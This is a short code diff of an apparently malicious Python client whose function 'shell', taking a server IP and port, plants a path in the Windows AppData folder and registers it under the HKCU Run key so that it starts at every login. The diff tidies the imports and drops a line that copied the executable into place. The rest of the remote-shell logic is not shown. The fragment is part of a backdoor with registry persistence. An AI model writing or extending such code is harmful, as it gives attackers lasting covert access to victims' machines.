@@ -1,10 +1,9 @@
-import shutil, sys, time, subprocess, os, socket, base64
+import subprocess,socket, base64, os, sys, time
 
 
 def shell(server_ip, server_port, data_size):
     path = os.environ['appdata'] + '\\main.ps1'
     if not os.path.exists(path):
-        shutil.copyfile(sys.executable, path)
         subprocess.call(
             'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v client /t REG_SZ /d "' + path + '"',
             shell=True)
